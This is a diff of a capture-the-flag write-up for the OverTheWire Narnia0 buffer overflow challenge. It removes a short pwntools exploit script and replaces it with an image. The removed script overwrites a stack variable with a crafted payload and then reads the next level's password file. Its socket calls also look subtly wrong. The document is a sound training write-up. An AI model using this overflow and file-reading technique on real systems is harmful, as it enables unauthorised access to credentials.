@@ -44,20 +44,7 @@ Great we have overwritten the val variable with 0x43434343 which is our 4 "C". N
 > Full exploit
 
 
-```python
-from pwn import *
-
-context(arch='i386', os='linux')
-context.log_level = 'debug'
-s = ssh(user='narnia0', host='narnia.labs.overthewire.org', port=2226, password='narnia0')
-sh = s.run('/narnia/narnia0')
-payload = ""
-payload = 'A'*20 + '\xef\xbe\xad\xde'
-s.sendline(payload)
-sh.recvline(s)
-s.sendline('cat /etc/narnia_pass/narnia1')
-sh.recvline(sh)
-```
+![source-02](/img/f5.png){: .align-left}
 
 ### Conclusion 
 Pwned! Nice and simple bufferoverflow challenge .Next challenge is Narnia1.
